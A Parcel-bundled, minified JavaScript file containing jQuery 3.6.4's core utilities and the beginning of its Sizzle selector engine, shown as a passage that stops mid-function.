!(function () {
  var t =
      "undefined" != typeof globalThis
        ? globalThis
        : "undefined" != typeof self
        ? self
        : "undefined" != typeof window
        ? window
        : "undefined" != typeof global
        ? global
        : {},
    n = {},
    r = {},
    i = t.parcelRequire94c2;
  null == i &&
    (((i = function (e) {
      if (e in n) return n[e].exports;
      if (e in r) {
        var t = r[e];
        delete r[e];
        var i = { id: e, exports: {} };
        return (n[e] = i), t.call(i.exports, i, i.exports), i.exports;
      }
      var o = new Error("Cannot find module '" + e + "'");
      throw ((o.code = "MODULE_NOT_FOUND"), o);
    }).register = function (e, t) {
      r[e] = t;
    }),
    (t.parcelRequire94c2 = i)),
    i.register("2B2k2", function (e, t) {
      var n = i("cK7q3");
      !(function (t, n) {
        "use strict";
        "object" == typeof e.exports
          ? (e.exports = t.document
              ? n(t, !0)
              : function (e) {
                  if (!e.document)
                    throw new Error("jQuery requires a window with a document");
                  return n(e);
                })
          : n(t);
      })("undefined" != typeof window ? window : void 0, function (e, t) {
        "use strict";
        var r = function (e, t, n) {
            var r,
              i,
              o = (n = n || le).createElement("script");
            if (((o.text = e), t))
              for (r in ce)
                (i = t[r] || (t.getAttribute && t.getAttribute(r))) &&
                  o.setAttribute(r, i);
            n.head.appendChild(o).parentNode.removeChild(o);
          },
          i = function (e) {
            return null == e
              ? e + ""
              : "object" == typeof e || "function" == typeof e
              ? ee[te.call(e)] || "object"
              : void 0 === e
              ? "undefined"
              : (0, n.default)(e);
          },
          o = function (e) {
            var t = !!e && "length" in e && e.length,
              n = i(e);
            return (
              !se(e) &&
              !ae(e) &&
              ("array" === n ||
                0 === t ||
                ("number" == typeof t && t > 0 && t - 1 in e))
            );
          },
          s = function (e, t) {
            return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase();
          },
          a = function (e, t, n) {
            return se(t)
              ? de.grep(e, function (e, r) {
                  return !!t.call(e, r, e) !== n;
                })
              : t.nodeType
              ? de.grep(e, function (e) {
                  return (e === t) !== n;
                })
              : "string" != typeof t
              ? de.grep(e, function (e) {
                  return J.call(t, e) > -1 !== n;
                })
              : de.filter(t, e, n);
          },
          l = function (e, t) {
            for (; (e = e[t]) && 1 !== e.nodeType; );
            return e;
          },
          c = function (e) {
            return e;
          },
          u = function (e) {
            throw e;
          },
          d = function (e, t, n, r) {
            var i;
            try {
              e && se((i = e.promise))
                ? i.call(e).done(t).fail(n)
                : e && se((i = e.then))
                ? i.call(e, t, n)
                : t.apply(void 0, [e].slice(r));
            } catch (e) {
              n.apply(void 0, [e]);
            }
          },
          p = function (e, t) {
            return t.toUpperCase();
          },
          f = function (e) {
            return e.replace($e, "ms-").replace(Se, p);
          },
          h = function (e, t, n) {
            var r;
            if (void 0 === n && 1 === e.nodeType)
              if (
                ((r = "data-" + t.replace(Oe, "-$&").toLowerCase()),
                "string" == typeof (n = e.getAttribute(r)))
              ) {
                try {
                  n = (function (e) {
                    return (
                      "true" === e ||
                      ("false" !== e &&
                        ("null" === e
                          ? null
                          : e === +e + ""
                          ? +e
                          : je.test(e)
                          ? JSON.parse(e)
                          : e))
                    );
                  })(n);
                } catch (e) {}
                Le.set(e, t, n);
              } else n = void 0;
            return n;
          },
          g = function (e, t, n, r) {
            var i,
              o,
              s = 20,
              a = r
                ? function () {
                    return r.cur();
                  }
                : function () {
                    return de.css(e, t, "");
                  },
              l = a(),
              c = (n && n[3]) || (de.cssNumber[t] ? "" : "px"),
              u =
                e.nodeType &&
                (de.cssNumber[t] || ("px" !== c && +l)) &&
                Ne.exec(de.css(e, t));
            if (u && u[3] !== c) {
              for (l /= 2, c = c || u[3], u = +l || 1; s--; )
                de.style(e, t, u + c),
                  (1 - o) * (1 - (o = a() / l || 0.5)) <= 0 && (s = 0),
                  (u /= o);
              (u *= 2), de.style(e, t, u + c), (n = n || []);
            }
            return (
              n &&
                ((u = +u || +l || 0),
                (i = n[1] ? u + (n[1] + 1) * n[2] : +n[2]),
                r && ((r.unit = c), (r.start = u), (r.end = i))),
              i
            );
          },
          m = function (e) {
            var t,
              n = e.ownerDocument,
              r = e.nodeName,
              i = Ue[r];
            return (
              i ||
              ((t = n.body.appendChild(n.createElement(r))),
              (i = de.css(t, "display")),
              t.parentNode.removeChild(t),
              "none" === i && (i = "block"),
              (Ue[r] = i),
              i)
            );
          },
          v = function (e, t) {
            for (var n, r, i = [], o = 0, s = e.length; o < s; o++)
              (r = e[o]).style &&
                ((n = r.style.display),
                t
                  ? ("none" === n &&
                      ((i[o] = ke.get(r, "display") || null),
                      i[o] || (r.style.display = "")),
                    "" === r.style.display && Me(r) && (i[o] = m(r)))
                  : "none" !== n && ((i[o] = "none"), ke.set(r, "display", n)));
            for (o = 0; o < s; o++) null != i[o] && (e[o].style.display = i[o]);
            return e;
          },
          y = function (e, t) {
            var n;
            return (
              (n =
                void 0 !== e.getElementsByTagName
                  ? e.getElementsByTagName(t || "*")
                  : void 0 !== e.querySelectorAll
                  ? e.querySelectorAll(t || "*")
                  : []),
              void 0 === t || (t && s(e, t)) ? de.merge([e], n) : n
            );
          },
          b = function (e, t) {
            for (var n = 0, r = e.length; n < r; n++)
              ke.set(e[n], "globalEval", !t || ke.get(t[n], "globalEval"));
          },
          x = function (e, t, n, r, o) {
            for (
              var s,
                a,
                l,
                c,
                u,
                d,
                p = t.createDocumentFragment(),
                f = [],
                h = 0,
                g = e.length;
              h < g;
              h++
            )
              if ((s = e[h]) || 0 === s)
                if ("object" === i(s)) de.merge(f, s.nodeType ? [s] : s);
                else if (Ke.test(s)) {
                  for (
                    a = a || p.appendChild(t.createElement("div")),
                      l = (Be.exec(s) || ["", ""])[1].toLowerCase(),
                      c = Ye[l] || Ye._default,
                      a.innerHTML = c[1] + de.htmlPrefilter(s) + c[2],
                      d = c[0];
                    d--;

                  )
                    a = a.lastChild;
                  de.merge(f, a.childNodes),
                    ((a = p.firstChild).textContent = "");
                } else f.push(t.createTextNode(s));
            for (p.textContent = "", h = 0; (s = f[h++]); )
              if (r && de.inArray(s, r) > -1) o && o.push(s);
              else if (
                ((u = Ie(s)), (a = y(p.appendChild(s), "script")), u && b(a), n)
              )
                for (d = 0; (s = a[d++]); ) Ge.test(s.type || "") && n.push(s);
            return p;
          },
          w = function () {
            return !0;
          },
          _ = function () {
            return !1;
          },
          T = function (e, t) {
            return (e === A()) == ("focus" === t);
          },
          A = function () {
            try {
              return le.activeElement;
            } catch (e) {}
          },
          C = function (e, t, n) {
            n
              ? (ke.set(e, t, !1),
                de.event.add(e, t, {
                  namespace: !1,
                  handler: function (e) {
                    var r,
                      i,
                      o = ke.get(this, t);
                    if (1 & e.isTrigger && this[t]) {
                      if (o.length)
                        (de.event.special[t] || {}).delegateType &&
                          e.stopPropagation();
                      else if (
                        ((o = V.call(arguments)),
                        ke.set(this, t, o),
                        (r = n(this, t)),
                        this[t](),
                        o !== (i = ke.get(this, t)) || r
                          ? ke.set(this, t, !1)
                          : (i = {}),
                        o !== i)
                      )
                        return (
                          e.stopImmediatePropagation(),
                          e.preventDefault(),
                          i && i.value
                        );
                    } else
                      o.length &&
                        (ke.set(this, t, {
                          value: de.event.trigger(
                            de.extend(o[0], de.Event.prototype),
                            o.slice(1),
                            this
                          ),
                        }),
                        e.stopImmediatePropagation());
                  },
                }))
              : void 0 === ke.get(e, t) && de.event.add(e, t, w);
          },
          $ = function (e, t) {
            return (
              (s(e, "table") &&
                s(11 !== t.nodeType ? t : t.firstChild, "tr") &&
                de(e).children("tbody")[0]) ||
              e
            );
          },
          S = function (e) {
            return (
              (e.type = (null !== e.getAttribute("type")) + "/" + e.type), e
            );
          },
          E = function (e) {
            return (
              "true/" === (e.type || "").slice(0, 5)
                ? (e.type = e.type.slice(5))
                : e.removeAttribute("type"),
              e
            );
          },
          D = function (e, t) {
            var n, r, i, o, s, a;
            if (1 === t.nodeType) {
              if (ke.hasData(e) && (a = ke.get(e).events))
                for (i in (ke.remove(t, "handle events"), a))
                  for (n = 0, r = a[i].length; n < r; n++)
                    de.event.add(t, i, a[i][n]);
              Le.hasData(e) &&
                ((o = Le.access(e)), (s = de.extend({}, o)), Le.set(t, s));
            }
          },
          k = function (e, t) {
            var n = t.nodeName.toLowerCase();
            "input" === n && ze.test(e.type)
              ? (t.checked = e.checked)
              : ("input" !== n && "textarea" !== n) ||
                (t.defaultValue = e.defaultValue);
          },
          L = function (e, t, n) {
            for (
              var r, i = t ? de.filter(t, e) : e, o = 0;
              null != (r = i[o]);
              o++
            )
              n || 1 !== r.nodeType || de.cleanData(y(r)),
                r.parentNode &&
                  (n && Ie(r) && b(y(r, "script")),
                  r.parentNode.removeChild(r));
            return e;
          },
          j = function (e, t, n) {
            var r,
              i,
              o,
              s,
              a = nt.test(t),
              l = e.style;
            return (
              (n = n || rt(e)) &&
                ((s = n.getPropertyValue(t) || n[t]),
                a && s && (s = s.replace(at, "$1") || void 0),
                "" !== s || Ie(e) || (s = de.style(e, t)),
                !oe.pixelBoxStyles() &&
                  tt.test(s) &&
                  ot.test(t) &&
                  ((r = l.width),
                  (i = l.minWidth),
                  (o = l.maxWidth),
                  (l.minWidth = l.maxWidth = l.width = s),
                  (s = n.width),
                  (l.width = r),
                  (l.minWidth = i),
                  (l.maxWidth = o))),
              void 0 !== s ? s + "" : s
            );
          },
          O = function (e, t) {
            return {
              get: function () {
                if (!e()) return (this.get = t).apply(this, arguments);
                delete this.get;
              },
            };
          },
          q = function (e) {
            return (
              de.cssProps[e] ||
              ut[e] ||
              (e in ct
                ? e
                : (ut[e] =
                    (function (e) {
                      for (
                        var t = e[0].toUpperCase() + e.slice(1), n = lt.length;
                        n--;

                      )
                        if ((e = lt[n] + t) in ct) return e;
                    })(e) || e))
            );
          },
          N = function (e, t, n) {
            var r = Ne.exec(t);
            return r ? Math.max(0, r[2] - (n || 0)) + (r[3] || "px") : t;
          },
          H = function (e, t, n, r, i, o) {
            var s = "width" === t ? 1 : 0,
              a = 0,
              l = 0;
            if (n === (r ? "border" : "content")) return 0;
            for (; s < 4; s += 2)
              "margin" === n && (l += de.css(e, n + He[s], !0, i)),
                r
                  ? ("content" === n &&
                      (l -= de.css(e, "padding" + He[s], !0, i)),
                    "margin" !== n &&
                      (l -= de.css(e, "border" + He[s] + "Width", !0, i)))
                  : ((l += de.css(e, "padding" + He[s], !0, i)),
                    "padding" !== n
                      ? (l += de.css(e, "border" + He[s] + "Width", !0, i))
                      : (a += de.css(e, "border" + He[s] + "Width", !0, i)));
            return (
              !r &&
                o >= 0 &&
                (l +=
                  Math.max(
                    0,
                    Math.ceil(
                      e["offset" + t[0].toUpperCase() + t.slice(1)] -
                        o -
                        l -
                        a -
                        0.5
                    )
                  ) || 0),
              l
            );
          },
          P = function (e, t, n) {
            var r = rt(e),
              i =
                (!oe.boxSizingReliable() || n) &&
                "border-box" === de.css(e, "boxSizing", !1, r),
              o = i,
              a = j(e, t, r),
              l = "offset" + t[0].toUpperCase() + t.slice(1);
            if (tt.test(a)) {
              if (!n) return a;
              a = "auto";
            }
            return (
              ((!oe.boxSizingReliable() && i) ||
                (!oe.reliableTrDimensions() && s(e, "tr")) ||
                "auto" === a ||
                (!parseFloat(a) && "inline" === de.css(e, "display", !1, r))) &&
                e.getClientRects().length &&
                ((i = "border-box" === de.css(e, "boxSizing", !1, r)),
                (o = l in e) && (a = e[l])),
              (a = parseFloat(a) || 0) +
                H(e, t, n || (i ? "border" : "content"), o, r, a) +
                "px"
            );
          },
          I = function () {
            return (
              e.setTimeout(function () {
                gt = void 0;
              }),
              (gt = Date.now())
            );
          },
          R = function (e, t) {
            var n,
              r = 0,
              i = { height: e };
            for (t = t ? 1 : 0; r < 4; r += 2 - t)
              i["margin" + (n = He[r])] = i["padding" + n] = e;
            return t && (i.opacity = i.width = e), i;
          },
          M = function (e, t, n) {
            for (
              var r,
                i = (xt.tweeners[t] || []).concat(xt.tweeners["*"]),
                o = 0,
                s = i.length;
              o < s;
              o++
            )
              if ((r = i[o].call(n, t, e))) return r;
          },
          U = function (e, t) {
            var n, r, i, o, s;
            for (n in e)
              if (
                ((i = t[(r = f(n))]),
                (o = e[n]),
                Array.isArray(o) && ((i = o[1]), (o = e[n] = o[0])),
                n !== r && ((e[r] = o), delete e[n]),
                (s = de.cssHooks[r]) && "expand" in s)
              )
                for (n in ((o = s.expand(o)), delete e[r], o))
                  n in e || ((e[n] = o[n]), (t[n] = i));
              else t[r] = i;
          },
          F = function (e) {
            return (e.match(we) || []).join(" ");
          },
          W = function (e) {
            return (e.getAttribute && e.getAttribute("class")) || "";
          },
          z = function (e) {
            return Array.isArray(e)
              ? e
              : ("string" == typeof e && e.match(we)) || [];
          },
          B = function (e) {
            return function (t, n) {
              "string" != typeof t && ((n = t), (t = "*"));
              var r,
                i = 0,
                o = t.toLowerCase().match(we) || [];
              if (se(n))
                for (; (r = o[i++]); )
                  "+" === r[0]
                    ? ((r = r.slice(1) || "*"), (e[r] = e[r] || []).unshift(n))
                    : (e[r] = e[r] || []).push(n);
            };
          },
          G = function (e, t, n, r) {
            var i = {},
              o = e === Wt;
            function s(a) {
              var l;
              return (
                (i[a] = !0),
                de.each(e[a] || [], function (e, a) {
                  var c = a(t, n, r);
                  return "string" != typeof c || o || i[c]
                    ? o
                      ? !(l = c)
                      : void 0
                    : (t.dataTypes.unshift(c), s(c), !1);
                }),
                l
              );
            }
            return s(t.dataTypes[0]) || (!i["*"] && s("*"));
          },
          Y = function (e, t) {
            var n,
              r,
              i = de.ajaxSettings.flatOptions || {};
            for (n in t)
              void 0 !== t[n] && ((i[n] ? e : r || (r = {}))[n] = t[n]);
            return r && de.extend(!0, e, r), e;
          },
          K = [],
          X = Object.getPrototypeOf,
          V = K.slice,
          Q = K.flat
            ? function (e) {
                return K.flat.call(e);
              }
            : function (e) {
                return K.concat.apply([], e);
              },
          Z = K.push,
          J = K.indexOf,
          ee = {},
          te = ee.toString,
          ne = ee.hasOwnProperty,
          re = ne.toString,
          ie = re.call(Object),
          oe = {},
          se = function (e) {
            return (
              "function" == typeof e &&
              "number" != typeof e.nodeType &&
              "function" != typeof e.item
            );
          },
          ae = function (e) {
            return null != e && e === e.window;
          },
          le = e.document,
          ce = { type: !0, src: !0, nonce: !0, noModule: !0 },
          de = function (e, t) {
            return new de.fn.init(e, t);
          };
        (de.fn = de.prototype =
          {
            jquery: "3.6.4",
            constructor: de,
            length: 0,
            toArray: function () {
              return V.call(this);
            },
            get: function (e) {
              return null == e
                ? V.call(this)
                : e < 0
                ? this[e + this.length]
                : this[e];
            },
            pushStack: function (e) {
              var t = de.merge(this.constructor(), e);
              return (t.prevObject = this), t;
            },
            each: function (e) {
              return de.each(this, e);
            },
            map: function (e) {
              return this.pushStack(
                de.map(this, function (t, n) {
                  return e.call(t, n, t);
                })
              );
            },
            slice: function () {
              return this.pushStack(V.apply(this, arguments));
            },
            first: function () {
              return this.eq(0);
            },
            last: function () {
              return this.eq(-1);
            },
            even: function () {
              return this.pushStack(
                de.grep(this, function (e, t) {
                  return (t + 1) % 2;
                })
              );
            },
            odd: function () {
              return this.pushStack(
                de.grep(this, function (e, t) {
                  return t % 2;
                })
              );
            },
            eq: function (e) {
              var t = this.length,
                n = +e + (e < 0 ? t : 0);
              return this.pushStack(n >= 0 && n < t ? [this[n]] : []);
            },
            end: function () {
              return this.prevObject || this.constructor();
            },
            push: Z,
            sort: K.sort,
            splice: K.splice,
          }),
          (de.extend = de.fn.extend =
            function () {
              var e,
                t,
                n,
                r,
                i,
                o,
                s = arguments[0] || {},
                a = 1,
                l = arguments.length,
                c = !1;
              for (
                "boolean" == typeof s &&
                  ((c = s), (s = arguments[a] || {}), a++),
                  "object" == typeof s || se(s) || (s = {}),
                  a === l && ((s = this), a--);
                a < l;
                a++
              )
                if (null != (e = arguments[a]))
                  for (t in e)
                    (r = e[t]),
                      "__proto__" !== t &&
                        s !== r &&
                        (c &&
                        r &&
                        (de.isPlainObject(r) || (i = Array.isArray(r)))
                          ? ((n = s[t]),
                            (o =
                              i && !Array.isArray(n)
                                ? []
                                : i || de.isPlainObject(n)
                                ? n
                                : {}),
                            (i = !1),
                            (s[t] = de.extend(c, o, r)))
                          : void 0 !== r && (s[t] = r));
              return s;
            }),
          de.extend({
            expando: "jQuery" + ("3.6.4" + Math.random()).replace(/\D/g, ""),
            isReady: !0,
            error: function (e) {
              throw new Error(e);
            },
            noop: function () {},
            isPlainObject: function (e) {
              var t, n;
              return !(
                !e ||
                "[object Object]" !== te.call(e) ||
                ((t = X(e)) &&
                  ("function" !=
                    typeof (n = ne.call(t, "constructor") && t.constructor) ||
                    re.call(n) !== ie))
              );
            },
            isEmptyObject: function (e) {
              var t;
              for (t in e) return !1;
              return !0;
            },
            globalEval: function (e, t, n) {
              r(e, { nonce: t && t.nonce }, n);
            },
            each: function (e, t) {
              var n,
                r = 0;
              if (o(e))
                for (n = e.length; r < n && !1 !== t.call(e[r], r, e[r]); r++);
              else for (r in e) if (!1 === t.call(e[r], r, e[r])) break;
              return e;
            },
            makeArray: function (e, t) {
              var n = t || [];
              return (
                null != e &&
                  (o(Object(e))
                    ? de.merge(n, "string" == typeof e ? [e] : e)
                    : Z.call(n, e)),
                n
              );
            },
            inArray: function (e, t, n) {
              return null == t ? -1 : J.call(t, e, n);
            },
            merge: function (e, t) {
              for (var n = +t.length, r = 0, i = e.length; r < n; r++)
                e[i++] = t[r];
              return (e.length = i), e;
            },
            grep: function (e, t, n) {
              for (var r = [], i = 0, o = e.length, s = !n; i < o; i++)
                !t(e[i], i) !== s && r.push(e[i]);
              return r;
            },
            map: function (e, t, n) {
              var r,
                i,
                s = 0,
                a = [];
              if (o(e))
                for (r = e.length; s < r; s++)
                  null != (i = t(e[s], s, n)) && a.push(i);
              else for (s in e) null != (i = t(e[s], s, n)) && a.push(i);
              return Q(a);
            },
            guid: 1,
            support: oe,
          }),
          "function" == typeof Symbol &&
            (de.fn[Symbol.iterator] = K[Symbol.iterator]),
          de.each(
            "Boolean Number String Function Array Date RegExp Object Error Symbol".split(
              " "
            ),
            function (e, t) {
              ee["[object " + t + "]"] = t.toLowerCase();
            }
          );
        var pe = (function (e) {
          var t,
            n,
            r,
            i,
            o,
            s,
            a,
            l,
            c,
            u,
            d,
            p,
            f,
            h,
            g,
            m,
            v,
            y,
            b,
            x = function (e, t, r, i) {
              var o,
                a,
                c,
                u,
                d,
                h,
                v,
                y = t && t.ownerDocument,
                x = t ? t.nodeType : 9;
              if (
                ((r = r || []),
                "string" != typeof e || !e || (1 !== x && 9 !== x && 11 !== x))
              )
                return r;
              if (!i && (p(t), (t = t || f), g)) {
                if (11 !== x && (d = me.exec(e)))
                  if ((o = d[1])) {
                    if (9 === x) {
                      if (!(c = t.getElementById(o))) return r;
                      if (c.id === o) return r.push(c), r;
                    } else if (
                      y &&
                      (c = y.getElementById(o)) &&
                      b(t, c) &&
                      c.id === o
                    )
                      return r.push(c), r;
                  } else {
                    if (d[2]) return V.apply(r, t.getElementsByTagName(e)), r;
                    if (
                      (o = d[3]) &&
                      n.getElementsByClassName &&
                      t.getElementsByClassName
                    )
                      return V.apply(r, t.getElementsByClassName(o)), r;
                  }
                if (
                  n.qsa &&
                  !z[e + " "] &&
                  (!m || !m.test(e)) &&
                  (1 !== x || "object" !== t.nodeName.toLowerCase())
                ) {
                  if (
                    ((v = e), (y = t), 1 === x && (le.test(e) || ae.test(e)))
                  ) {
                    for (
                      ((y = (ve.test(e) && k(t.parentNode)) || t) === t &&
                        n.scope) ||
                        ((u = t.getAttribute("id"))
                          ? (u = u.replace(xe, we))
                          : t.setAttribute("id", (u = P))),
                        a = (h = s(e)).length;
                      a--;

                    )
                      h[a] = (u ? "#" + u : ":scope") + " " + j(h[a]);
                    v = h.join(",");
                  }
                  try {
                    return V.apply(r, y.querySelectorAll(v)), r;
                  } catch (t) {
                    z(e, !0);
                  } finally {
                    u === P && t.removeAttribute("id");
                  }
                }
              }
              return l(e.replace(oe, "$1"), t, r, i);
            },
            w = function () {
              var e = [];
              return function t(n, i) {
                return (
                  e.push(n + " ") > r.cacheLength && delete t[e.shift()],
                  (t[n + " "] = i)
                );
              };
            },
            _ = function (e) {
              return (e[P] = !0), e;
            },
            T = function (e) {
              var t = f.createElement("fieldset");
              try {
                return !!e(t);
              } catch (e) {
                return !1;
              } finally {
                t.parentNode && t.parentNode.removeChild(t), (t = null);
              }
            },
            A = function (e, t) {
              for (var n = e.split("|"), i = n.length; i--; )
                r.attrHandle[n[i]] = t;
            },
            C = function (e, t) {
              var n = t && e,
                r =
                  n &&
                  1 === e.nodeType &&
                  1 === t.nodeType &&
                  e.sourceIndex - t.sourceIndex;
              if (r) return r;
              if (n) for (; (n = n.nextSibling); ) if (n === t) return -1;
              return e ? 1 : -1;
            },
            $ = function (e) {
              return function (t) {
                return "input" === t.nodeName.toLowerCase() && t.type === e;
              };
            },
            S = function (e) {
              return function (t) {
                var n = t.nodeName.toLowerCase();
                return ("input" === n || "button" === n) && t.type === e;
              };
            },
            E = function (e) {
              return function (t) {
                return "form" in t
                  ? t.parentNode && !1 === t.disabled
                    ? "label" in t
                      ? "label" in t.parentNode
                        ? t.parentNode.disabled === e
                        : t.disabled === e
                      : t.isDisabled === e ||
                        (t.isDisabled !== !e && Te(t) === e)
                    : t.disabled === e
                  : "label" in t && t.disabled === e;
              };
            },
            D = function (e) {
              return _(function (t) {
                return (
                  (t = +t),
                  _(function (n, r) {
                    for (var i, o = e([], n.length, t), s = o.length; s--; )
                      n[(i = o[s])] && (n[i] = !(r[i] = n[i]));
                  })
                );
              });
            },
            k = function (e) {
              return e && void 0 !== e.getElementsByTagName && e;
            },
            L = function () {},
            j = function (e) {
              for (var t = 0, n = e.length, r = ""; t < n; t++) r += e[t].value;
              return r;
            },
            O = function (e, t, n) {
              var r = t.dir,
                i = t.next,
                o = i || r,
                s = n && "parentNode" === o,
                a = M++;
              return t.first
                ? function (t, n, i) {
                    for (; (t = t[r]); )
                      if (1 === t.nodeType || s) return e(t, n, i);
                    return !1;
                  }
                : function (t, n, l) {
                    var c,
                      u,
                      d,
                      p = [R, a];
                    if (l) {
                      for (; (t = t[r]); )
                        if ((1 === t.nodeType || s) && e(t, n, l)) return !0;
                    } else
                      for (; (t = t[r]); )
                        if (1 === t.nodeType || s)
                          if (
                            ((u =
                              (d = t[P] || (t[P] = {}))[t.uniqueID] ||
                              (d[t.uniqueID] = {})),
                            i && i === t.nodeName.toLowerCase())
                          )
                            t = t[r] || t;
                          else {
                            if ((c = u[o]) && c[0] === R && c[1] === a)
                              return (p[2] = c[2]);
                            if (((u[o] = p), (p[2] = e(t, n, l)))) return !0;
                          }
                    return !1;
                  };
            },
            q = function (e) {
              return e.length > 1
                ? function (t, n, r) {
                    for (var i = e.length; i--; ) if (!e[i](t, n, r)) return !1;
                    return !0;
                  }
                : e[0];
            },
            N = function (e, t, n) {
              for (var r = 0, i = t.length; r < i; r++) x(e, t[r], n);
              return n;
            },
            H = function (e, t, n, r, i) {
              for (
                var o, s = [], a = 0, l = e.length, c = null != t;
                a < l;
                a++
              )
                (o = e[a]) &&
                  ((n && !n(o, r, i)) || (s.push(o), c && t.push(a)));
              return s;
            },
            P = "sizzle" + 1 * new Date(),
            I = e.document,
            R = 0,
            M = 0,
            U = w(),
            F = w(),
            W = w(),
            z = w(),
            B = function (e, t) {
              return e === t && (d = !0), 0;
            },
            G = {}.hasOwnProperty,
            Y = [],
            K = Y.pop,
            X = Y.push,
            V = Y.push,
            Q = Y.slice,
            Z = function (e, t) {
              for (var n = 0, r = e.length; n < r; n++)
                if (e[n] === t) return n;
              return -1;
            },
            J =
              "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
            ee = "[\\x20\\t\\r\\n\\f]",
            te =
              "(?:\\\\[\\da-fA-F]{1,6}" +
              ee +
              "?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+",
            ne =
              "\\[" +
              ee +
              "*(" +
              te +
              ")(?:" +
              ee +
              "*([*^$|!~]?=)" +
              ee +
              "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" +
              te +
              "))|)" +
              ee +
              "*\\]",
            re =
              ":(" +
              te +
              ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" +
              ne +
              ")*)|.*)\\)|)",
            ie = new RegExp(ee + "+", "g"),
            oe = new RegExp(
              "^" + ee + "+|((?:^|[^\\\\])(?:\\\\.)*)" + ee + "+$",
              "g"
            ),
            se = new RegExp("^" + ee + "*," + ee + "*"),
            ae = new RegExp("^" + ee + "*([>+~]|" + ee + ")" + ee + "*"),
            le = new RegExp(ee + "|>"),
            ce = new RegExp(re),
            ue = new RegExp("^" + te + "$"),
            de = {
              ID: new RegExp("^#(" + te + ")"),
              CLASS: new RegExp("^\\.(" + te + ")"),
              TAG: new RegExp("^(" + te + "|[*])"),
              ATTR: new RegExp("^" + ne),
              PSEUDO: new RegExp("^" + re),
              CHILD: new RegExp(
                "^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" +
                  ee +
                  "*(even|odd|(([+-]|)(\\d*)n|)" +
                  ee +
                  "*(?:([+-]|)" +
                  ee +
                  "*(\\d+)|))" +
                  ee +
                  "*\\)|)",
                "i"
              ),
              bool: new RegExp("^(?:" + J + ")$", "i"),
              needsContext: new RegExp(
                "^" +
                  ee +
                  "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" +
                  ee +
                  "*((?:-\\d)?\\d*)" +
                  ee +
                  "*\\)|)(?=[^-]|$)",
                "i"
              ),
            },
            pe = /HTML$/i,
            fe = /^(?:input|select|textarea|button)$/i,
            he = /^h\d$/i,
            ge = /^[^{]+\{\s*\[native \w/,
            me = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
            ve = /[+~]/,
            ye = new RegExp(
              "\\\\[\\da-fA-F]{1,6}" + ee + "?|\\\\([^\\r\\n\\f])",
              "g"
            ),
            be = function (e, t) {
              var n = "0x" + e.slice(1) - 65536;
              return (
                t ||
                (n < 0
                  ? String.fromCharCode(n + 65536)
                  : String.fromCharCode((n >> 10) | 55296, (1023 & n) | 56320))
              );
            },
            xe = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,
            we = function (e, t) {
              return t
                ? "\0" === e
                  ? "�"
                  : e.slice(0, -1) +
                    "\\" +
                    e.charCodeAt(e.length - 1).toString(16) +
                    " "
                : "\\" + e;
            },
            _e = function () {
              p();
            },
            Te = O(
              function (e) {
                return (
                  !0 === e.disabled && "fieldset" === e.nodeName.toLowerCase()
                );
              },
              { dir: "parentNode", next: "legend" }
            );
          try {
            V.apply((Y = Q.call(I.childNodes)), I.childNodes),
              Y[I.childNodes.length].nodeType;
          } catch (e) {
            V = {
              apply: Y.length
                ? function (e, t) {
                    X.apply(e, Q.call(t));
                  }
                : function (e, t) {
                    for (var n = e.length, r = 0; (e[n++] = t[r++]); );
                    e.length = n - 1;
                  },
            };
          }
          for (t in ((n = x.support = {}),
          (o = x.isXML =
            function (e) {
              var t = e && e.namespaceURI,
                n = e && (e.ownerDocument || e).documentElement;
              return !pe.test(t || (n && n.nodeName) || "HTML");
            }),
          (p = x.setDocument =
            function (e) {
              var t,
                i,
                s = e ? e.ownerDocument || e : I;
              return s != f && 9 === s.nodeType && s.documentElement
                ? ((h = (f = s).documentElement),
                  (g = !o(f)),
                  I != f &&
                    (i = f.defaultView) &&
                    i.top !== i &&
                    (i.addEventListener
                      ? i.addEventListener("unload", _e, !1)
                      : i.attachEvent && i.attachEvent("onunload", _e)),
                  (n.scope = T(function (e) {
                    return (
                      h.appendChild(e).appendChild(f.createElement("div")),
                      void 0 !== e.querySelectorAll &&
                        !e.querySelectorAll(":scope fieldset div").length
                    );
                  })),
                  (n.cssHas = T(function () {
                    try {
                      return f.querySelector(":has(*,:jqfake)"), !1;
                    } catch (e) {
                      return !0;
                    }
                  })),
                  (n.attributes = T(function (e) {
                    return (e.className = "i"), !e.getAttribute("className");
                  })),
                  (n.getElementsByTagName = T(function (e) {
                    return (
                      e.appendChild(f.createComment("")),
                      !e.getElementsByTagName("*").length
                    );
                  })),
                  (n.getElementsByClassName = ge.test(
                    f.getElementsByClassName
                  )),
                  (n.getById = T(function (e) {
                    return (
                      (h.appendChild(e).id = P),
                      !f.getElementsByName || !f.getElementsByName(P).length
                    );
                  })),
                  n.getById
                    ? ((r.filter.ID = function (e) {
                        var t = e.replace(ye, be);
                        return function (e) {
                          return e.getAttribute("id") === t;
                        };
                      }),
                      (r.find.ID = function (e, t) {
                        if (void 0 !== t.getElementById && g) {
                          var n = t.getElementById(e);
                          return n ? [n] : [];
                        }
                      }))
                    : ((r.filter.ID = function (e) {
                        var t = e.replace(ye, be);
                        return function (e) {
                          var n =
                            void 0 !== e.getAttributeNode &&
                            e.getAttributeNode("id");
                          return n && n.value === t;
                        };
                      }),
                      (r.find.ID = function (e, t) {
                        if (void 0 !== t.getElementById && g) {
                          var n,
                            r,
                            i,
                            o = t.getElementById(e);
                          if (o) {
                            if ((n = o.getAttributeNode("id")) && n.value === e)
                              return [o];
                            for (
                              i = t.getElementsByName(e), r = 0;
                              (o = i[r++]);

                            )
                              if (
                                (n = o.getAttributeNode("id")) &&
                                n.value === e
                              )
                                return [o];
                          }
                          return [];
                        }
                      })),
                  (r.find.TAG = n.getElementsByTagName
                    ? function (e, t) {
                        return void 0 !== t.getElementsByTagName
                          ? t.getElementsByTagName(e)
                          : n.qsa
                          ? t.querySelectorAll(e)
                          : void 0;
                      }
                    : function (e, t) {
                        var n,
                          r = [],
                          i = 0,
